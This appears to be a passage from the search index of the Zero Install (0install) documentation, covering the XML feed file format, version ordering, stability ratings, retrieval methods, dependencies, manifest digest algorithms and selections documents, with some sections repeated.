path= '...' ? command= '...' ? ... > ... </binding> If command is given, then 0install will select the given <command> within the implementation (which may cause additional dependencies and bindings to be selected). Otherwise, no command is selected. Any additional attributes and child elements are not processed, but are just passed through. If your binding needs a path within the selected implementation, it is suggested that the path attribute be used for this. Other attributes and child elements should be namespaced to avoid collisions. For example, the EBox application launcher allows each code module to specify its dependencies, which are then available in the module's scope as getters . The ebox-edit application depends on the help library like this: <requires interface= \"http://0install.net/tests/ebox-help.xml\" > <binding e:getter= 'help' /> </requires> Versions \u00b6 A version number string has the following form: Version := DottedList (\"-\" Modifier? DottedList?)* DottedList := (Integer (\".\" Integer)*) Modifier := \"pre\" | \"rc\" | \"post\" Numerically, the modifiers come in the order -pre (pre-release), -rc (release candidate), - (no modifier name), -post (post-release or patch level). Versions are ordered like this: 0.1 1 1.0 1.1 1.2-pre 1.2-pre1 1.2-rc1 1.2 1.2-0 1.2-post 1.2-post1-pre 1.2-post1 1.2.1-pre 1.2.1.4 1.2.2 1.2.10 3 0install doesn't care about anything other than the sort order (i.e., whether one version comes before or after another). It is expected that an implementation can be safely replaced by one with a later version number, but not necessarily with an earlier one. So, if an application works with version 1.2.1 of a library then it should also work with version 1.2.2 or 1.3 or even 5.7 , but not 1.2.0 . This is a little different to some other systems, where numbers in different places have different meanings. For example, if the latest version of a library you use is version 5.1, then you shouldn't add the restriction before='5.2' , because when 5.2 comes out it should still work with your program. Of course, this might not always work, and hopefully the problem will be reported while the new library version is marked as testing (before most users hit the problem). Once you know that 5.2 is a problem, you can add the before='5.2' restriction to the implementation then. Incompatible changes (where a newer version cannot be used in place of an older version) to an interface should be handled by creating a new interface URI. Eg: http://gtk.org/2005/interfaces/GTK-1.2.x (contains 1.2.0, 1.2.1, 1.2.2, ...) http://gtk.org/2005/interfaces/GTK-2.x (contains 2.0.0, 2.0.1, 2.2.0, 2.4.0, 2.4.1, ...) The integers in version numbers must be representable as 64-bit signed integers. Note Version numbers containing dash characters were not supported before version 0.24 of 0install and so a version-modifier attribute was added to allow new-style versions to be added without breaking older versions. This should no longer be used. Stability \u00b6 The feed file also gives a stability rating for each implementation. The following levels are allowed (must be lowercase in the feed files): stable testing developer buggy insecure Stability ratings are expected to change over time. When any new release is made, its stability should be set to testing . Users who have selected Help test new versions will then start using it. Other users will continue with the previous stable release. After a while (days, weeks or months, depending on the project) with no serious problems found, the implementation's stability can be changed to stable so that everyone will use it. If problems are found, it can instead be marked as buggy , or insecure . 0install won't select either by default, but it is useful to users to see the reason (users may opt to continue using a buggy version if it seems to work for them, but they should never use an insecure one). developer is like a more extreme version of testing , where the program is expected to have bugs. When to use 'buggy' \u00b6 Don't mark old releases as buggy every time you do a new release, just because a few bugs have been fixed. People who have selected Network use: Full will automatically upgrade to the new version anyway, so marking an older version as buggy only affects people who have explicitly stated that they don't want to use the latest version, but would prefer to use an older release to save network use. Entry points \u00b6 (only used on the Windows version currently) Entry points allow you to associate additional information with <command> names, such as user-friendly names and descriptions. Entry points are used by the Zero Install GUI to help the user choose a command and by the desktop integration system to generate appropriate menu entries for commands. An entry point is not necessary for a command to work but it makes it more discoverable to end-users. Entry points are top-level elements and, unlike commands, are not associated with any specific implementation or group. One entry point represents all commands in all implementations that carry the same name. An entry point has this syntax: <entry-point command= '...' binary-name= '...' ? > <needs-terminal/> ? <name> ... </name> ? <summary> ... </summary> ? <description> ... </description> ? <icon type= '...' href= '...' /> * </group> command the name of the command this entry point represents binary-name the canonical name of the binary supplying the command (without file extensions); this is used to suggest suitable alias names. <needs-terminal> if present, this element indicates that the command represented by this entry point requires a terminal in order to run. <name> user-friendly name for the command. If not present, the value of the command attribute is used instead. <summary> a short one-line description; the first word should not be upper-case unless it is a proper noun (e.g. \"cures all ills\") <description> a full description, which can be several paragraphs long <icon> an icon to represent the command; this is used when creating menu entries. You should provide an icon of the type image/png ( .png ) for Linux apps and image/vnd.microsoft.icon ( .ico ) for Windows apps. Metadata \u00b6 All elements can contain extension elements, provided they are not in the Zero Install namespace used by the elements defined here. 0install does not currently make use of these elements itself, but other programs may find them useful. In future, some of these may be used (for example, the GUI may display the license terms). The use of Dublin Core is suggested for the following concepts, which have the following meanings when found as a direct child of a <group> or <implementation> element: dc:creator The primary author of the program. dc:publisher The person who created this implementation. For a binary, this is the person who compiled it. Other Dublin Core terms that may be useful include contributor , dateCopyrighted , language , rights and rightsHolder . These terms are not required as they are duplicated by the core Zero Install terms: identifier ( id ), available ( released ) and requires ( requires ). The source element may be used in future to record the source used to build this implementation. Digital signatures \u00b6 When a feed is downloaded from the web, it must contain a digital signature. A feed is signed by appending an XML comment block of the form: <!-- Base64 Signature iD8DBQBEXM/qrgeCgFmlPMERArNSAKDBuNz5SQMZ8rwJmW2fhNHJwor6KwCgwx7XEfY+6gUC90rJ b5eCY+I8HNA= --> This block must go at the end of the file, and contains a Base64-encoded version of the file that would be created by using gpg --detach-sign on the original feed. The signature block must start on a new line, may not contain anything except valid base64 characters, and nothing may follow the signature block. XML signature blocks are supported from version 0.18 of 0install and may be generated easily using the 0publish command. Local interfaces are plain XML, although having an XML signature block is no problem as it will be ignored as a normal XML comment. Valid architecture names \u00b6 The arch attribute is a value in the form OS-CPU . The values come from the uname system call, but there is some normalisation (e.g. because Windows doesn't report the same CPU names as Linux). Valid values for OS include: * Cygwin (a Unix-compatibility layer for Windows) Darwin (MacOSX, without the proprietary bits) FreeBSD Linux MacOSX Windows Valid values for CPU include: * src i386 i486 i586 i686 ppc ppc64 x86_64 armv6l armv7l The if-0install-version attribute \u00b6 To make it possible to use newer features in a feed without breaking older versions of 0install, the if-0install-version attribute may be placed on any element to indicate that the element should only be processed by the specified versions of 0install. Example <group> <new-element if-0install-version= '1.14..' /> <fallback if-0install-version= '..!1.14' /> </group> In this example, 0install 1.14 and later will see <new-element> , while older versions see <fallback> . The syntax is as described in Constraints . Attention 0install versions before 1.13 ignore this attribute and process all elements. Well-known extensions \u00b6 The following are well-known extensions to the Zero Install format: Capabilities (provides information for desktop integration of applications) Future plans \u00b6 The extra meta-data elements need to be better specified. As well as before and not-before, we should support after and not-after. It should be possible to give a delta (binary patch) against a previous version, to make upgrading quicker. It should be possible to scope bindings. For example, when a DTP package requires a clipart package, the clipart package should not be allowed to affect the DTP package's environment.","title":"Feed files"},{"location":"specifications/feed/#feed-files","text":"This document is a formal description of the XML feed file format. An interface describes a program, library or other component. A feed provides a list of known implementations of the interface (versions of the program) and details about how to get them, how to check that they are authentic, how to run them and what other components they depend on. This class diagram shows how the different concepts are related. Each feed file contributes information to this model: Each Feed lists a number of Implementations (versions). An Identity is a way to recognise an Implementation (e.g. a cryptographic digest). A Retrieval method is a way to get an Implementation (e.g. by downloading from a web site). A Command says how to run an Implementation as a program. A Dependency indicates that one component depends on another (e.g. Gimp requires the GTK library). A Binding says how to let the program locate the Implementations when run. A Constraint limits the choice of a dependency (e.g. Gimp requires a version of GTK >= 2.6).

Older versions will tell the user to upgrade if they are asked to read the file. Versions prior to 0.20 do not perform this check, however. If the attribute is not present, the file can be read by all versions. uri This attribute is only needed for remote feeds (fetched via HTTP).

For Windows apps you should additionally provide an icon of the type image/vnd.microsoft.icon ( .ico ). <feed> the linked feed contains more implementations of this feed's interface. The langs and arch attributes, if present, indicate that all implementations will fall within these limits (e.g. arch='*-src' means that there is no point fetching this feed unless you are looking for source code). See the <implementation> element for a description of the values of these attributes. <feed-for> the implementations in this feed are implementations of the given interface. This is used when adding an optional extra feed to an interface with 0install add-feed (e.g. a local feed for a development version). <replaced-by> this feed's interface (the one in the root element's uri attribute) has been replaced by the given interface.

For example, when the user marks a particular version as buggy this identifier is used to keep track of it, and saving and restoring selections uses it. However, see the important historical note below . local-path If the feed file is a local file (the interface uri starts with / ) then the local-path attribute may contain the pathname of a local directory (either an absolute path or a path relative to the directory containing the feed file). See the historical note below. version The version number. See the version numbers section below for more details. main (deprecated) The relative path of an executable inside the implementation that should be executed by default when the interface is run. If an implementation has no main setting, then it cannot be executed without specifying one manually (with 0install run --main=MAIN ). This typically means that the interface is for a library. Note: main is being replaced by the <command> element. self-test (deprecated) The relative path of an executable inside the implementation that can be executed to test the program. The program must be non-interactive (e.g. it can't open any windows or prompt for input). It should return with an exit status of zero if the tests pass. Any other status indicates failure. Note: self-test is being replaced by the <command> element. doc-dir The relative path of a directory inside the implementation that contains the package's documentation. This is the directory that would end up inside /usr/share/doc on a traditional Linux system. released The date this implementation was made available, in the format YYYY-MM-DD . For development versions checked out from version control this attribute should not be present. stability The default stability rating for this implementation. If not present, testing is used. See the stability section below for more details. langs The natural language(s) which this package supports, as a space-separated list of languages codes (in the same format as used by the $LANG environment variable). For example, the value en_GB fr would be used for a package supporting British English and French. Supported since 0.48. Note that versions before 0.54 require the region separator to be _ (underscore), while later versions also allow the use of - for consistency with the xml:lang format. arch For platform-specific binaries, the platform for which this implementation was compiled, in the form os-cpu . 0install knows that certain platforms are backwards-compatible with others, so binaries with arch=\"Linux-i486\" will still be available on Linux-i686 machines, for example. Either the os or cpu part may be * , which will make it available on any OS or CPU. If missing, the default is *-* . See also: Valid architecture names . license License terms. This is typically a Trove category. See the PyPI list for some examples (the leading License :: is not included). The manifest-digest element is used to give digests of the .manifest file using various hashing algorithms (but see the historical note below). Having multiple algorithms allows a smooth upgrade to newer digest algorithms without breaking old clients. Each non-namespaced attribute gives a digest, with the attribute name being the algorithm. Example <manifest-digest sha256= \"4f078f9080bd9b3b87e8360f014268886ec653ed077bb3cb6725185c0a07473a\" /> For non-local implementations (those without a local-path attribute), the <implementation> element contains a set of retrieval methods , each of which gives a different way of getting the implementation (i.e. of getting a directory structure whose digest matches the ones given). Currently, 0install always chooses the first of the methods it understands, but in future it may use other strategies (such as choosing the closest mirror, or letting the user select one manually). It may also use other methods which aren't listed, such as searching for the implementation on a peer-to-peer network. Unrecognised elements inside an implementation are ignored.","title":"Implementations"},{"location":"specifications/feed/#historical-note-about-id","text":"0install >= 0.45 generally treats the ID as a simple identifier, and gets the local path (if any) from the local-path attribute and the digests from the <manifest-digest> . 0install < 0.45 ignores the local-path attribute and the <manifest-digest> element. If the ID starts with . or / then the ID is also the local path; otherwise, it is the single manifest digest. For backwards compatibility, 0install >= 0.45 will treat an ID starting with . or / as a local path if no local-path attribute is present, and it will treat it as an additional digest if it contains an = character.

The <command> element (supported since 0.51, released Dec 2010) provides a more flexible alternative. <command name= '...' path= '...' ? > [binding] * [requires] * [runner] ? <arg> ... </arg> * <for-each item-from= '...' separator= '...' ? > ... </for-each> * </command> name By default, 0install executes the run command, but the --command option can be used to specify a different one. 0test runs the test command (replacing the old self-test attribute) and 0compile runs the compile command (replacing the compile:command attribute). path The relative path of the executable within the implementation (optional if <runner> is used). Additional arguments can be passed using the <arg> element. Within an argument, ${name} is expanded to the value of the corresponding environment variable. These arguments are passed to the program before any arguments specified by the user. If an environment variable should be expanded to multiple arguments, use <for-each> . The variable in the item-from attribute is split using the given separator (which defaults to the OS path separator, : on POSIX and ; on Windows) and the arguments inside the element are added for each item. The current item is available as ${item} . If the variable given in item-from is not set or is empty, no arguments are added. See below for an example. Versions of 0install before 1.15 ignore <for-each> elements and their contents. Command-specific dependencies can be specified for a command by nesting <requires> elements. For example, an interpreter might only depend on libreadline when used interactively, but not when used as a library, or the test command might depend on a test framework. Command-specific bindings (0install >= 1.3) create a binding from the implementation to itself. For example, the test command may want to make the run command available in $PATH using <executable-in-path> . The <runner> element introduces a special kind of dependency: the program that is used to run this one. For example, a Python program might specify Python as its runner. <runner> is a subclass of <requires> and accepts the same attributes and child elements. In addition, you can specify arguments to pass to the runner by nesting them inside the <runner> element. These arguments are passed before the path of the executable given by the path attribute. Example <command name= 'run' path= \"causeway.e-swt\" > <runner interface= 'http://repo.roscidus.com/e/e-core' > <arg> -cpa </arg> <arg> $SWT_JAR </arg> <for-each item-from= \"EXTRA_E_OPTIONS\" separator= \" \" > <arg> ${item} </arg> </for-each> </runner> </command> In this case, 0install will run the equivalent of /path/to/e-interpreter -cpa /path/to/swt.jar $EXTRA_E_OPTIONS /path/to/causeway.e-swt .","title":"Commands"},{"location":"specifications/feed/#package-implementations","text":"This element names a distribution-provided package which, if present, is a valid implementation of this interface. The syntax is: <package-implementation package= '...' distributions= '...' ? main= '...' ? version= '...' ? > [command] * [requires] * </package-implementation> Support for distribution packages was added in version 0.28 of 0install. Earlier versions ignore this element. If the named package is available then it will be considered as a possible implementation of the interface. If main is given then it must be an absolute path. If the distributions attribute is present then it is a space-separated list of distribution names where this element applies. 0install >= 0.45 ranks the <package-implementation> elements according to how well they match the host distribution and then only uses the best match (or matches, if several get the same score). See Distribution integration for a list of supported distributions. Earlier versions of 0install ignore the distributions attribute and process all of the elements. Note that, unlike a normal implementation, a distribution package does not resolve to a directory. Any bindings inside <requires> elements for the interface will be ignored; it is assumed that the requiring component knows how to use the packaged version without further help. Therefore, adding distribution packages to your interface considerably weakens the guarantees you are making about what the requester may get. Package implementations still inherit attributes and dependencies from their parent group. The doc-dir and license attributes may be given, but version and released are read from the native packaging system. If version is given then only implmentations matching this pattern are used (0install >= 2.14). This allows multiple <packages-implmentation> elements for a single distribution package, which is useful if different versions have different requirements. See Constraints for the syntax.","title":"Package implementations"},{"location":"specifications/feed/#retrieval-methods","text":"A retrieval method is a way of getting an implementation. The most common retrieval method is the <archive> element: <archive href= '...' size= '...' extract= '...' ? dest= '...' ? type= '...' ? start-offset= '...' ? /> This states that an archive may be downloaded from the address given in the href attribute. The archive must have the given size or it will be rejected. When unpacked (either the subdirectory named in the extract attribute, or the whole archive if it is not present), the resulting tree will generate a manifest with the secure hash value given as the implementation's id . If dest is given (0install >= 2.1), then the archive is unpacked to the specified subdirectory. It is an error to specify a target outside of the implementation directory (e.g. ../foo or attempting to follow a symlink that points out of the implementation). Note that the extract attribute cannot contain / or \\ characters, so it can only be used to extract a top-level directory. It is intended for archives that contain their own name as the single top-level entry. The type of the archive is given as a MIME type in the type attribute (since 0install version 0.21). If missing, the type is guessed from the extension on the href attribute (all versions). Known types and extensions (case insensitive) are: application/zip ( .zip ) application/x-tar ( .tar ) application/x-compressed-tar ( .tar.gz or .tgz ) application/x-bzip-compressed-tar ( .tar.bz2 or .tbz2 ) application/x-xz-compressed-tar ( .tar.xz or .txz ) - since version 0.43, since version 2.11 on Windows application/x-lzma-compressed-tar ( .tar.lzma or .tlzma ) application/x-lzip-compressed-tar ( .tar.lz or .tlz ) - since version 2.18, Windows only application/x-zstd-compressed-tar ( .tar.zst ) - since version 2.18, Windows only application/x-ruby-gem ( .gem ) - since version 1.0-rc1 application/x-7z-compressed ( .7z ) - Windows only application/vnd.rar ( .rar ) - since version 2.18, Windows only application/vnd.ms-cab-compressed ( .cab ) application/x-msi ( .msi ) - Windows only application/x-deb ( .deb ) - not supported on Windows application/x-rpm ( .rpm ) - not supported on Windows application/x-apple-diskimage ( .dmg ) - not supported on Windows The start-offset attribute (since version 0.21) gives the number of bytes at the beginning of the file which should be ignored. This is useful for some self-extracting archives which are made up of a shell script followed by a normal archive in a single file. If missing, it defaults to 0. The value in the size attribute does not include the skipped bytes. You can also fetch individual files (0install >= 2.1). This is useful for e.g. jar files, which are typically not unpacked: <file href= '...' size= '...' dest= '...' executable= 'true|false' ? /> The file is downloaded from href , must be of the given size , and is placed within the implementation directory as dest .

To get an implementation by following a recipe, a new empty directory is created and then all of the steps are performed in sequence. The resulting directory must have the digest given in the implementation's <manifest-digest> . A recipe containing only a single archive is equivalent to just specifying the archive on its own. If a recipe contains an unrecognised element then the whole recipe must be ignored. <archive ...> Causes the named archive to be fetched and unpacked over the top of whatever is currently in the temporary directory. It supports the same attributes as when used outside of a recipe. <file ...> Causes the named file to be fetched and saved over the top of whatever is currently in the temporary directory (0install >= 2.1).

The specified id must exactly match the id attribute of another implementation specified elsewhere in the same feed. You can specify the source and destination file or directory to be copied relative to the implementation root. Leave them unset to copy the entire implementation. Tip A recipe is generally only useful for patching existing archives without having to host the complete result yourself. Normally, if your program requires files from several different packages then it is better to use the <requires> element instead. This allows libraries to be shared between different programs, and lets the user choose the versions and upgrade them individually.","title":"Recipes"},{"location":"specifications/feed/#dependencies","text":"A <requires> element means that every implementation within the same group (including nested sub-groups) requires an implementation of the specified interface when run. 0install will choose a suitable implementation, downloading one if required. <requires interface= '...' importance= '...' ? version= '...' ? os= '...' ? distribution= '...' ? source= 'true|false' ? use= '...' ? > [ constraints ] * [ bindings ] * </requires> The constraint elements (if any) limit the set of acceptable versions. The bindings specify how 0install should make its choice known (typically, by setting environment variables). The use attribute can be used to indicate that this dependency is only needed in some cases. By default, 0install >= 0.43 will skip any <requires> element with this attribute set. Earlier versions process all <requires> elements whether this attribute is present or not. 0test >= 0.2 will process dependencies where use=\"testing\" , in addition to the program's normal dependencies. This attribute is deprecated - it's usually better to use a <command> for this. The importance attribute (0install >= 1.1) can be either essential (the default; a version of this dependency must be selected) or recommended (no version is also an option, although selecting a version is preferable to not selecting one). The version attribute (0install >= 1.13) provides a quick way to specify the permitted versions. See the Constraints section below. The distribution attribute (0install >= 1.15) can be used to require the selected implementation to be from the given distribution. For example, a Python library available through MacPorts can only be used with a version of Python which is also from MacPorts. The value of this attribute is a space-separated list of distribution names. In addition to the official list of distribution names , the special value 0install may be used to require an implementation provided by 0instal (i.e. one not provided by a <package-implementation> ). The os attribute (0install >= 1.12) can be used to indicate that the dependency only applies to the given OS (e.g. os=\"Windows\" for dependencies only needed on Windows systems). The source attribute (0install >= 2.8) can be used to indicate that a source implementation is needed rather than a binary. This may be useful if you want to get e.g. header files from a source package. Note that if you select both source and binary implementations of an interface, 0install does not automatically force them to be the same version. A <restricts> element (0install >= 1.10) can be used to apply constraints without creating a dependency: <restricts interface= '...' version= '...' ? os= '...' ? distribution= '...' ? > [ constraints ] * </restricts> Internally, <restricts> behaves much like <requires importance='recommended'> , except that it doesn't try to cause the interface to be selected at all.","title":"Dependencies"},{"location":"specifications/feed/#constraints","text":"Constraints appear on <requires> , <restricts> , <package-implementation> and <runner> elements.

Example <restricts interface= 'https://apps.0install.net/python/python.xml' version= '2.6..!3 | 3.2.2..' /> This allows Python versions 2.6, 2.7 and 3.3, but not 2.5 or 3. Each range is in the form START..!END . The range matches versions where START <= VERSION < END . The start or end may be omitted. A single version number may be used instead of a range to match only that version, or !VERSION to match everything except that version.

Each environment element gives the name of the variable and the relative path of the item within the implementation to insert into the variable's value. Usually, the (badly-named) insert attribute is used, which adds a path to a file or directory inside the implementation to the environment variable. For example, <environment name='PATH' insert='bin'/> would perform something similar to the bash shell statement export PATH=/path/to/impl/bin:$PATH . Alternatively, you can use the value attribute to use a literal string. For example, <environment name='GRAPHICAL_MODE' value='TRUE' mode='replace'/> . This requires 0install >= 0.52. If mode is prepend (or not set), then the absolute path of the item is prepended to the current value of the variable. The default separator character is the colon character on POSIX systems, and semi-colon on Windows. This can be overridden using separator (0install >= 1.1). If the environment variable is not currently set then the path is prepended to the value of the default attribute. If no default value is given either then the default for that environment variable is used, or the environment variable's value is set to the absolute path directly if there is no default. If mode is append then the same thing happens, except that the new value is added at the end instead of the beginning. If the mode is replace then the old value is overwritten, and the default attribute is ignored.

Otherwise, no command is selected. Any additional attributes and child elements are not processed, but are just passed through. If your binding needs a path within the selected implementation, it is suggested that the path attribute be used for this. Other attributes and child elements should be namespaced to avoid collisions. For example, the EBox application launcher allows each code module to specify its dependencies, which are then available in the module's scope as getters .

It is expected that an implementation can be safely replaced by one with a later version number, but not necessarily with an earlier one. So, if an application works with version 1.2.1 of a library then it should also work with version 1.2.2 or 1.3 or even 5.7 , but not 1.2.0 . This is a little different to some other systems, where numbers in different places have different meanings. For example, if the latest version of a library you use is version 5.1, then you shouldn't add the restriction before='5.2' , because when 5.2 comes out it should still work with your program. Of course, this might not always work, and hopefully the problem will be reported while the new library version is marked as testing (before most users hit the problem). Once you know that 5.2 is a problem, you can add the before='5.2' restriction to the implementation then. Incompatible changes (where a newer version cannot be used in place of an older version) to an interface should be handled by creating a new interface URI. Eg: http://gtk.org/2005/interfaces/GTK-1.2.x (contains 1.2.0, 1.2.1, 1.2.2, ...) http://gtk.org/2005/interfaces/GTK-2.x (contains 2.0.0, 2.0.1, 2.2.0, 2.4.0, 2.4.1, ...)

Adding, deleting, renaming or modifying any file in a tree will change its digest. It should be infeasibly difficult to generate a new tree with the same digest as a given tree. Thus, if you know the digest of the implementation you want, and someone gives you a tree with that digest, you can trust that it is the implementation you want. This document describes how a digest is calculated from a directory tree. Algorithms \u00b6 There are several different algorithms that can be used to generate a digest from a directory tree, so an implementation's identifier includes the algorithm. This allows new algorithms to be added easily if weaknesses are discovered in older ones. The currently supported algorithms are: sha1=XXX This is supported by all versions of 0install. It is less secure than the format used with the other algorithms. sha1new=XXX Supported from version 0.20. This is the same hash as sha1 but with the new manifest format. sha256=XXX Supported from version 0.20 and also requires the hashlib Python module to be installed. sha256new_XXX Supported from version 1.10. This is the same as sha256 , except that the final digest is base32-encoded (without padding) to make it a bit shorter, and the separator character is _ rather than = , as pathnames containing = cause problems for some programs. When checking a new tree (e.g., that has just been downloaded from the net and unpacked), 0install generates a 'manifest' file. The manifest lists every file, directory and symlink in the tree, and gives the digest of each file's content. Here is a sample manifest file for a tree containing two files ( README and src/main.c ) and using the sha1 algorithm (you can use 0install digest --manifest to generate this): F 0a4d55a8d778e5022fab701977c5d840bbc486d0 1132502750 11 README D 1132502769 /src F 83832457b29a423c8e6daf05c6dbcba17d0514dd 1132502769 17 main.c If you generate a manifest file for a directory tree and find that it is identical to the manifest file you want, then you can feel confident that you have the tree you want. This is convenient, because the manifest file is much smaller than the packaged tree. After checking, the generated manifest file is stored in a file called .manifest in the top-level of the tree. To save even more space, we can simply compare the digests (rather than the contents ) of these manifest files. For example, the digest of the three-line manifest file above is given by: $ sha1sum .manifest b848561cd89be1b806ee00008a503c63eb4ad56e When 0install adds a new archive to the cache, the top-level directory is renamed to this final digest (so the main.c above would be stored as .../sha1=b848561cd89be1b806ee00008a503c63eb4ad56e/src/main.c , for example). Because only the digest of the manifest is needed, it is not strictly necessary to store the .manifest file at all. However, if the tree is modified later somehow it can show you exactly which files were changed (rather than just letting you know that the tree has changed in some unknown way). Manifest file format \u00b6 This description of the manifest file is based on Joachim's 12 Oct 2005 post to the zero-install-devel list: The manifest file lists, line by line, all nodes in a directory identified as / , without / itself. All relevant numbers are coded as decimal numbers without leading zeros (unless 0 is to be coded, which is coded as 0 ). Times are represented as the number of seconds since the epoch. Nodes are of one of their possible types: D , F , X , and S . Names must not contain newline characters (the tree will be rejected if they do). The file itself is encoded as UTF-8, with Unix line-endings ( \\n ) and no BOM . Note that some operating systems treat filenames as sequences of bytes (rather than as sequences of characters), and thus may be able to handle filenames which cannot be represented as strings. A Zero Install implementation cannot contain such filenames. Directories \u00b6 D nodes correspond to directories, and their line format is: \"D\", space, [mtime, space,] full path name, newline So, top level directories, for example, would have a \"full path name\" that matches the regular expression ^/[^/\\n]+$ . The modification time is only included when using the original sha1 algorithm, as it was not found to be useful and caused problems with many archives. Files \u00b6 F and X nodes correspond to files and executable files, respectively, and their line formats are: \"F\", space, hash, space, mtime, space, size, space, file name, newline \"X\", space, hash, space, mtime, space, size, space, file name, newline As opposed to directories, no full path names are given. Hence, file names match ^[^/\\n]+$ . The hash is the hexadecimal representation of the digest of the contents of the respective file, using the same digest algorithm as the manifest file itself. Hexadecimal digits a through f are used (rather than A through F). Symlinks \u00b6 S nodes correspond to symbolic links, and their line format is: \"S\", space, hash, space, size, space, symlink name, newline The symlink name is given analogously to file names in F and X nodes. The size of a symlink is the number of bytes in its target (name). The hash sum, similarly to that of files, is the digest of the target (name) of the respective symlink. Other files types \u00b6 It is an error for a tree to contain other types of object (such as device files). Such trees are rejected. Ordering \u00b6 These lines appear in the order of a depth-first search. Within a directory, regular files and symlinks come first (ordered lexicographically by their name, i.e., they appear in the order that LC_ALL=C sort would produce), and then each subdirectory (again sorted in the same way). For the original sha1 algorithm the sort order is slightly different: sub-directories, regular files and symlinks are all sorted together rather than the subdirectories always coming after other types. Implementations have to abide by these rules to the letter because such a file is to be generated automatically and this process absolutely must generate the same file that the directory tree packager had computed.","title":"Manifest files"},{"location":"specifications/manifest/#manifest-files","text":"Zero Install implementations are directory trees identified by an algorithm name (e.g., \"sha256\"), and digest of their contents calculated using that algorithm. Adding, deleting, renaming or modifying any file in a tree will change its digest. It should be infeasibly difficult to generate a new tree with the same digest as a given tree. Thus, if you know the digest of the implementation you want, and someone gives you a tree with that digest, you can trust that it is the implementation you want. This document describes how a digest is calculated from a directory tree.","title":"Manifest files"},{"location":"specifications/manifest/#algorithms","text":"There are several different algorithms that can be used to generate a digest from a directory tree, so an implementation's identifier includes the algorithm. This allows new algorithms to be added easily if weaknesses are discovered in older ones. The currently supported algorithms are: sha1=XXX This is supported by all versions of 0install. It is less secure than the format used with the other algorithms. sha1new=XXX Supported from version 0.20. This is the same hash as sha1 but with the new manifest format. sha256=XXX Supported from version 0.20 and also requires the hashlib Python module to be installed. sha256new_XXX Supported from version 1.10. This is the same as sha256 , except that the final digest is base32-encoded (without padding) to make it a bit shorter, and the separator character is _ rather than = , as pathnames containing = cause problems for some programs. When checking a new tree (e.g., that has just been downloaded from the net and unpacked), 0install generates a 'manifest' file. The manifest lists every file, directory and symlink in the tree, and gives the digest of each file's content. Here is a sample manifest file for a tree containing two files ( README and src/main.c ) and using the sha1 algorithm (you can use 0install digest --manifest to generate this): F 0a4d55a8d778e5022fab701977c5d840bbc486d0 1132502750 11 README D 1132502769 /src F 83832457b29a423c8e6daf05c6dbcba17d0514dd 1132502769 17 main.c If you generate a manifest file for a directory tree and find that it is identical to the manifest file you want, then you can feel confident that you have the tree you want. This is convenient, because the manifest file is much smaller than the packaged tree. After checking, the generated manifest file is stored in a file called .manifest in the top-level of the tree. To save even more space, we can simply compare the digests (rather than the contents ) of these manifest files. For example, the digest of the three-line manifest file above is given by: $ sha1sum .manifest b848561cd89be1b806ee00008a503c63eb4ad56e When 0install adds a new archive to the cache, the top-level directory is renamed to this final digest (so the main.c above would be stored as .../sha1=b848561cd89be1b806ee00008a503c63eb4ad56e/src/main.c , for example). Because only the digest of the manifest is needed, it is not strictly necessary to store the .manifest file at all. However, if the tree is modified later somehow it can show you exactly which files were changed (rather than just letting you know that the tree has changed in some unknown way).","title":"Algorithms"},{"location":"specifications/manifest/#manifest-file-format","text":"This description of the manifest file is based on Joachim's 12 Oct 2005 post to the zero-install-devel list: The manifest file lists, line by line, all nodes in a directory identified as / , without / itself.

A selections document contains all the information needed to launch a program. 0install generates a selections document by collecting information from multiple feeds and then running a solver to choose the best combination of components. For example, to generate the selections document for the ROX Edit application: $ 0install select --xml http://rox.sourceforge.net/2005/interfaces/Edit For an app , foo , the current selections can be found in ~/.config/0install.net/apps/foo/selections.xml . For binaries generated by 0compile , the selections used to build it can be found in the 0install directory of the binary package, in the build-environment.xml file. <selections> \u00b6 A selections document contains a set of selections, one per selected interface. <?xml version=\"1.0\" ?> <selections xmlns= \"http://zero-install.sourceforge.net/2004/injector/interface\" interface= \"...\" command= \"...\" ? source= \"true|false\" ? > [ selection ] + </selections> interface The URI of the main program being run (e.g. \"http://rox.sourceforge.net/2005/interfaces/Edit\"). command The name of the (optional) <command> to run on the main program (e.g. \"run\"). source Indicates whether the root is source or binary (since 0install 2.8).

In later versions, the commands go inside their <selection> elements, which is needed to support executable bindings. Before 0install 0.51, there were no commands at all. Instead, the <selection> for the main interface had a main attribute which was used (the command should be treated as \"run\" in this case). <selection> \u00b6 <selection interface= \"...\" from-feed= \"...\" ? local-path= \"...\" ? quick-test-file= \"...\" ? quick-test-mtime= \"...\" ? requires-compilation= \"true\" ? ... > [ dependencies ] [ bindings ] [ digests ] [ commands ] </selection> interface Indicates that this is the selected implementation of this interface. from-feed The URL of the feed which provided this implementation.

This is sometimes used with distribution-provided selections. If not present and the ID starts with \"package:\", you'll need to query the distribution's package manager to check that this version is still installed. quick-test-mtime If present, the quick test file must not only exist, but must have this mtime (an integer number of seconds since the Unix epoch). For systems which provide more accurate times, ignore the fractional part (round down towards zero). requires-compilation If present, this attribute indicates that the selection does not yet exist, but could be compiled from the source implementation with the same id . Such selections can be generated when using 0install select --may-compile (0install >= 2.9).

Process all the bindings to set up the new environment. Build the command line arguments, starting with the main command and following the chain of <runner> s. Exec the new process. Checking the selections are up-to-date \u00b6 This is how 0install checks the selections for an app before running them: If any input files have changed or disappeared since the solver last ran, we re-run the solver. The files checked are: The previously selected feed files (local or cached). Configuration files for the selected interfaces (e.g. preferred stability). The global configuration file (e.g. preferred stability). 0install currently ignores feeds and interfaces which were considered but not selected. If any selections are no longer present, we rerun the solver. For distribution packages, we check that the version hasn't changed. If it has been a while since we checked for updates, we trigger a background update but run the current selections anyway. Processing bindings \u00b6 For each <selection> , 0install will: Process all bindings directly inside the <selection> . Process all dependencies directly inside the <selection> : Find the selection for the required interface (note: may be missing for non-essential dependencies). Process all bindings inside the dependency. Process all commands directly inside the <selection> : Process all bindings inside the command.

Note: you must do this after expanding all other environment variables because of $-expansion in <arg> . A binding directly inside a <selection> or <command> binds a selection to itself (e.g. a Python library may wish to add itself to PYTHONPATH). Bindings inside dependencies bind to the dependency (e.g. a Python program may wish to add a library to PYTHONPATH ). A distribution-provided selection does not have a path, and so any <environment> bindings for it are skipped (e.g. it's up to the distribution package manager to ensure that Python libraries it provides are in the default search path).

